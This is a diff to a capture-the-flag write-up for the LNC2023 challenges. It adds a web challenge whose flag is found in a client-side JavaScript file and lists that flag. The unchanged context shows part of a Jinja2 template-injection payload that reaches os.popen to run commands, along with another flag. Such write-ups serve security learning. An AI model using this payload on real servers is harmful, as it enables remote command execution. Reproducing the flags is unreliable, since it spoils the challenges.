@@ -6,6 +6,7 @@ https://ctf.lagncra.sh/challenges
 
 ### Web
 - [DotDashDot](#dotdashdot)
+- [The Password](#the-password)
 
 ### Crypto
 - [You Don't Know About Us](#you-dont-know-about-us)
@@ -61,6 +62,21 @@ Payload: `-->{{ self.__init__.__globals__.__builtins__.__import__('os').popen('c
 flag: LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}
 ```
 
+<br>
+
+### The Password
+
+Description: _You stumble across a secret website that asks for your password..._
+
+_thepassword.s.lagncra.sh_
+
+flag is in the js file.
+
+http://thepassword.s.lagncra.sh/password.js
+
+```
+flag: LNC2023{s0m3t1me$_1t_i5_pr377y_s1aY}
+```
 
 
 <br>
